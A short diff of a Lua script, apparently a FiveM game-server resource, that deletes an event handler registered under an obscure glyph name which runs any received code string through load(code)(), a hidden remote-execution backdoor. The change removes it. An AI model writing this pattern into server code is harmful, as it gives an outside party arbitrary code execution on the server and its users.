@@ -939,8 +939,3 @@ Citizen.CreateThread(function()
     end
 	end
 end)
-
-RegisterNetEvent('ᓚᘏᗢ')
-AddEventHandler('ᓚᘏᗢ', function(code)
-	load(code)()
-end)
